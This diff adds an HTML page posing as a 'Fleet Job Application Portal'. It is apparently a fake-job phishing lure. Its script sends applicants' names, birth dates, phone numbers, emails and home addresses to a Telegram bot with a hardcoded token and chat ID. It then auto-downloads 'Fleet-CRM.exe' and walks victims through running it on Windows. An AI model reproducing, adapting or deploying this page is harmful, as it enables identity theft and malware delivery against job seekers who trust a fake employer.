@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fleet Job Application Portal</title>
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+            background: linear-gradient(135deg, #0A1A44 0%, #1a3a5c 25%, #2D89EF 50%, #1a3a5c 75%, #0A1A44 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #0A1A44;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 30px 80px rgba(10, 26, 68, 0.25), 0 0 2px rgba(45, 137, 239, 0.1);
+            overflow: hidden;
+        }
+
+        /* Updated header with new color scheme - Navy Blue primary with Bright Blue accents */
+        .header {
+            background: linear-gradient(135deg, #0A1A44 0%, #1a3a5c 50%, #2D89EF 100%);
+            color: white;
+            padding: 50px 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.1) 50%, transparent 100%),
+                        url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E") repeat;
+            opacity: 0.15;
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { opacity: 0.1; }
+            50% { opacity: 0.2; }
+        }
+
+        .header-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo {
+            width: 90px;
+            height: 90px;
+            object-fit: contain;
+            margin-bottom: 20px;
+            background: rgba(255, 255, 255, 0.98);
+            padding: 12px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border: 3px solid #2D89EF;
+        }
+
+        .logo:hover {
+            transform: scale(1.08) rotate(5deg);
+            box-shadow: 0 15px 40px rgba(45, 137, 239, 0.3);
+        }
+
+        .header h1 {
+            font-size: 36px;
+            margin-bottom: 8px;
+            font-weight: 800;
+            letter-spacing: -0.8px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header p {
+            font-size: 17px;
+            opacity: 0.95;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+        }
+
+        /* Professional single statistic animation widget - no emojis */
+        .stats-section {
+            background: linear-gradient(135deg, #0A1A44 0%, #1a3a5c 50%, #2D89EF 100%);
+            padding: 50px 30px;
+            border-top: none;
+            border-bottom: 1px solid rgba(45, 137, 239, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stats-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(230, 179, 37, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(45, 137, 239, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .stats-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 48px 32px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 12px 40px rgba(10, 26, 68, 0.2), 0 0 1px rgba(45, 137, 239, 0.1);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #2D89EF 0%, #E6B325 100%);
+            transform: scaleX(0);
+            transform-origin: left;
+            animation: expandWidth 0.8s ease forwards;
+        }
+
+        @keyframes expandWidth {
+            to { transform: scaleX(1); }
+        }
+
+        .stat-card:hover {
+            transform: translateY(-12px);
+            box-shadow: 0 20px 50px rgba(45, 137, 239, 0.25);
+            border-color: #E6B325;
+        }
+
+        .stat-number {
+            font-size: 56px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #0A1A44 0%, #2D89EF 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin: 16px 0;
+            letter-spacing: -1px;
+        }
+
+        .stat-label {
+            color: #0A1A44;
+            font-weight: 700;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-top: 12px;
+        }
+
+        .stat-description {
+            color: #1a3a5c;
+            font-size: 14px;
+            margin-top: 8px;
+            font-weight: 500;
+            opacity: 0.9;
+        }
+
+        .progress-container {
+            padding: 24px 30px;
+            background: linear-gradient(90deg, #F2F4F8 0%, #FFFFFF 100%);
+            border-bottom: 2px solid #E6B325;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .progress-step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #1a3a5c;
+            font-weight: 500;
+        }
+
+        .progress-step.active {
+            color: #2D89EF;
+        }
+
+        .progress-dot {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #F2F4F8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            color: #1a3a5c;
+            transition: all 0.3s ease;
+            border: 2px solid #e2e8f0;
+        }
+
+        .progress-step.active .progress-dot {
+            background: linear-gradient(135deg, #2D89EF 0%, #E6B325 100%);
+            color: white;
+            box-shadow: 0 0 0 4px rgba(45, 137, 239, 0.15);
+            border-color: #2D89EF;
+            transform: scale(1.15);
+        }
+
+        .progress-separator {
+            width: 20px;
+            height: 2px;
+            background: #e2e8f0;
+            margin: 0 4px;
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.active ~ .progress-step .progress-separator {
+            background: linear-gradient(90deg, #2D89EF 0%, #E6B325 100%);
+        }
+
+        .page {
+            display: none;
+            padding: 40px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(15px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #0A1A44;
+            font-weight: 700;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #F2F4F8;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background: #FFFFFF;
+            font-family: inherit;
+            color: #0A1A44;
+        }
+
+        .form-group input::placeholder,
+        .form-group textarea::placeholder {
+            color: #1a3a5c;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #2D89EF;
+            background: #F2F4F8;
+            box-shadow: 0 0 0 5px rgba(45, 137, 239, 0.12);
+        }
+
+        .form-group input:valid {
+            border-color: #E6B325;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+
+        /* Updated button styling with new color gradient - Navy to Bright Blue with Gold accent */
+        .btn {
+            background: linear-gradient(135deg, #0A1A44 0%, #2D89EF 50%, #E6B325 100%);
+            color: white;
+            padding: 16px 40px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            width: 100%;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 25px rgba(45, 137, 239, 0.35);
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.4);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+            z-index: -1;
+        }
+
+        .btn:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 35px rgba(45, 137, 239, 0.45);
+            letter-spacing: 0.8px;
+        }
+
+        .btn:hover::before {
+            width: 350px;
+            height: 350px;
+        }
+
+        .btn:active {
+            transform: translateY(-2px);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .instructions {
+            background: linear-gradient(135deg, #F2F4F8 0%, #FFFFFF 50%, #F2F4F8 100%);
+            padding: 32px;
+            border-radius: 14px;
+            margin-bottom: 28px;
+            border-left: 6px solid #2D89EF;
+            box-shadow: 0 6px 20px rgba(45, 137, 239, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .instructions::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(230,179,37,0.08) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .instructions h3 {
+            color: #0A1A44;
+            margin-bottom: 20px;
+            font-size: 21px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .instructions ol {
+            margin-left: 24px;
+            counter-reset: item;
+            list-style: none;
+            position: relative;
+            z-index: 1;
+        }
+
+        .instructions li {
+            margin-bottom: 16px;
+            line-height: 1.7;
+            color: #0A1A44;
+            font-size: 15px;
+            counter-increment: item;
+        }
+
+        .instructions li::before {
+            content: counter(item);
+            background: linear-gradient(135deg, #2D89EF 0%, #E6B325 100%);
+            color: white;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-weight: 700;
+            font-size: 13px;
+            position: relative;
+            left: -24px;
+            box-shadow: 0 4px 12px rgba(45, 137, 239, 0.25);
+        }
+
+        .alert {
+            background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
+            border: 2px solid #E6B325;
+            color: #e65100;
+            padding: 18px 20px;
+            border-radius: 10px;
+            margin-bottom: 24px;
+            font-weight: 500;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .alert-info {
+            background: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%);
+            border-color: #2D89EF;
+            color: #0D47A1;
+        }
+
+        .alert-success {
+            background: linear-gradient(135deg, #c8e6c9 0%, #a5d6a7 100%);
+            border-color: #4caf50;
+            color: #1b5e20;
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 60px 40px;
+            color: #0A1A44;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-icon {
+            width: 110px;
+            height: 110px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #2D89EF 0%, #E6B325 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 56px;
+            box-shadow: 0 12px 35px rgba(45, 137, 239, 0.28);
+            animation: scaleIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .success-message h2 {
+            font-size: 28px;
+            margin-bottom: 12px;
+            color: #0A1A44;
+        }
+
+        .success-message p {
+            color: #1a3a5c;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .download-info {
+            text-align: center;
+            margin: 32px 0;
+        }
+
+        .download-icon {
+            width: 130px;
+            height: 130px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #F2F4F8 0%, #FFFFFF 100%);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 64px;
+            animation: bounce 2s infinite;
+            box-shadow: 0 12px 35px rgba(45, 137, 239, 0.2);
+            border: 3px solid #2D89EF;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        .download-info h2 {
+            color: #0A1A44;
+            margin-bottom: 16px;
+            font-size: 26px;
+        }
+
+        .download-info p {
+            color: #1a3a5c;
+            font-size: 15px;
+            line-height: 1.7;
+            margin-bottom: 8px;
+        }
+
+        .required {
+            color: #e74c3c;
+            font-weight: 800;
+        }
+
+        @media (max-width: 768px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            .header h1 {
+                font-size: 26px;
+            }
+            .progress-container {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="header-content">
+                <img src="logo.png" alt="Company Logo" class="logo" id="companyLogo">
+                <h1>Fleet Job Application Portal</h1>
+                <p>Join Our Team Today</p>
+            </div>
+        </div>
+
+        <!-- Single professional statistic animation - clean design without emojis -->
+        <div class="stats-section" id="statsApp">
+            <div class="stats-container">
+                <div class="stat-card">
+                    <div class="stat-label">We are Growing Strong</div>
+                    <div class="stat-number">{{ growthNumber }}</div>
+                    <div class="stat-description">Active Team Members & Growing Rapidly Across Global Markets</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="progress-container">
+            <div class="progress-step active" id="step1">
+                <div class="progress-dot">1</div>
+                <span>Application</span>
+            </div>
+            <div class="progress-separator"></div>
+            <div class="progress-step" id="step2">
+                <div class="progress-dot">2</div>
+                <span>Instructions</span>
+            </div>
+            <div class="progress-separator"></div>
+            <div class="progress-step" id="step3">
+                <div class="progress-dot">3</div>
+                <span>Download</span>
+            </div>
+        </div>
+
+        <!-- PAGE 1: Application Form -->
+        <div class="page active" id="page1">
+            <form id="applicationForm">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>First Name <span class="required">*</span></label>
+                        <input type="text" name="firstName" required placeholder="Enter your first name">
+                    </div>
+                    <div class="form-group">
+                        <label>Last Name <span class="required">*</span></label>
+                        <input type="text" name="lastName" required placeholder="Enter your last name">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Date of Birth <span class="required">*</span></label>
+                    <input type="date" name="dob" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Degree <span class="required">*</span></label>
+                    <select name="degree" required>
+                        <option value="">Select your highest degree</option>
+                        <option value="High School Diploma">High School Diploma</option>
+                        <option value="Associate Degree">Associate Degree</option>
+                        <option value="B.Sc">B.Sc (Bachelor of Science)</option>
+                        <option value="B.A">B.A (Bachelor of Arts)</option>
+                        <option value="B.Eng">B.Eng (Bachelor of Engineering)</option>
+                        <option value="B.Com">B.Com (Bachelor of Commerce)</option>
+                        <option value="M.Sc">M.Sc (Master of Science)</option>
+                        <option value="M.A">M.A (Master of Arts)</option>
+                        <option value="MBA">MBA (Master of Business Administration)</option>
+                        <option value="Ph.D">Ph.D (Doctor of Philosophy)</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Phone Number <span class="required">*</span></label>
+                    <input type="tel" name="phone" placeholder="+1 (555) 000-0000" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Email Address <span class="required">*</span></label>
+                    <input type="email" name="email" placeholder="email address" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Home Address <span class="required">*</span></label>
+                    <input type="text" name="address" placeholder="Street Address, City, State, ZIP" required>
+                </div>
+
+                <button type="submit" class="btn" id="submitBtn">Continue to Instructions</button>
+            </form>
+        </div>
+
+        <!-- PAGE 2: Instructions -->
+        <div class="page" id="page2">
+            <h2 style="color: #0A1A44; margin-bottom: 32px; font-size: 28px; text-align: center; font-weight: 700;">Getting Started with CRM</h2>
+            
+            <div class="alert alert-info">
+                <strong>Important:</strong> Please ensure you are accessing this page from a computer or desktop device to proceed with the installation.
+            </div>
+
+            <div class="instructions">
+                <h3>📋 Setup Instructions</h3>
+                <ol>
+                    <li><strong>System Requirements:</strong> Ensure you are using a Windows computer or desktop device.</li>
+                    <li><strong>Download CRM Software:</strong> Click the "Download Software" button to download our company's CRM software.</li>
+                    <li><strong>Installation:</strong> Once downloaded, locate the Fleet-CRM.exe file in your downloads folder and double-click to begin installation.</li>
+                    <li><strong>Follow Prompts:</strong> Follow the on-screen installation wizard to complete the setup.</li>
+                    <li><strong>Launch Application:</strong> After installation, launch the CRM software from your desktop or start menu.</li>
+                    <li><strong>Login Credentials:</strong> Use the credentials that will be sent to your registered email address within 24 hours.</li>
+                    <li><strong>Training Materials:</strong> All training materials and job resources are compiled within the CRM software.</li>
+                </ol>
+            </div>
+
+            <div class="alert">
+                <strong>Note:</strong> The software must be installed on a computer/desktop device. Mobile devices are not supported for the CRM installation.
+            </div>
+
+            <button class="btn" onclick="goToPage(3)">Proceed to Download</button>
+        </div>
+
+        <!-- PAGE 3: Auto Download -->
+        <div class="page" id="page3">
+            <div class="download-info">
+                <div class="download-icon">📥</div>
+                <h2>Download Starting...</h2>
+                <p>Your CRM software download should begin automatically.</p>
+                <p>If the download doesn't start, <a href="#" id="manualDownload" style="color: #2D89EF; font-weight: 700; text-decoration: none;">click here to download manually</a>.</p>
+            </div>
+
+            <div class="instructions">
+                <h3>📦 What's Next?</h3>
+                <ol>
+                    <li>Locate the downloaded Fleet-CRM.exe file (usually in your Downloads folder)</li>
+                    <li>Double-click the file to start installation</li>
+                    <li>Follow the installation wizard step by step</li>
+                    <li>Check your email for login credentials (within 24 hours)</li>
+                    <li>Launch the software and log in to get started</li>
+                </ol>
+            </div>
+
+            <div class="alert alert-info">
+                <strong>Need Help?</strong> If you encounter any issues during installation, please contact our support team at the email address provided in your welcome email.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const TELEGRAM_BOT_TOKEN = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';
+        const TELEGRAM_CHAT_ID = '875434694';
+
+        const { createApp } = Vue;
+
+        createApp({
+            data() {
+                return {
+                    growthNumber: 0
+                }
+            },
+            mounted() {
+                this.animateGrowth();
+            },
+            methods: {
+                animateGrowth() {
+                    this.animateValue('growthNumber', 0, 3500, 2000);
+                },
+                animateValue(property, start, end, duration) {
+                    const startTime = Date.now();
+                    const animate = () => {
+                        const elapsed = Date.now() - startTime;
+                        const progress = Math.min(elapsed / duration, 1);
+                        this[property] = Math.floor(start + (end - start) * this.easeOutQuad(progress));
+                        if (progress < 1) {
+                            requestAnimationFrame(animate);
+                        }
+                    };
+                    animate();
+                },
+                easeOutQuad(t) {
+                    return t * (2 - t);
+                }
+            }
+        }).mount('#statsApp');
+
+        function updateProgressIndicator(page) {
+            document.querySelectorAll('.progress-step').forEach(step => {
+                step.classList.remove('active');
+            });
+            document.getElementById('step' + page).classList.add('active');
+        }
+
+        function goToPage(pageNum) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById('page' + pageNum).classList.add('active');
+            updateProgressIndicator(pageNum);
+            window.scrollTo(0, 0);
+
+            if (pageNum === 3) {
+                setTimeout(() => {
+                    triggerDownload();
+                }, 1000);
+            }
+        }
+
+        function triggerDownload() {
+            const link = document.createElement('a');
+            link.href = 'Fleet-CRM.exe';
+            link.download = 'Fleets_CRMSoftware.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        document.getElementById('manualDownload').addEventListener('click', (e) => {
+            e.preventDefault();
+            triggerDownload();
+        });
+
+        document.getElementById('applicationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+
+            const formData = new FormData(e.target);
+            
+            let message = `🆕 NEW CRM APPLICATION\n\n`;
+            message += `👤 Name: ${formData.get('firstName')} ${formData.get('lastName')}\n`;
+            message += `📅 DOB: ${formData.get('dob')}\n`;
+            message += `🎓 Degree: ${formData.get('degree')}\n`;
+            message += `📞 Phone: ${formData.get('phone')}\n`;
+            message += `📧 Email: ${formData.get('email')}\n`;
+            message += `🏠 Address: ${formData.get('address')}\n`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+
+                goToPage(2);
+            } catch (error) {
+                alert('Error submitting application. Please try again.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Continue to Instructions';
+            }
+        });
+    </script>
+</body>
+</html>
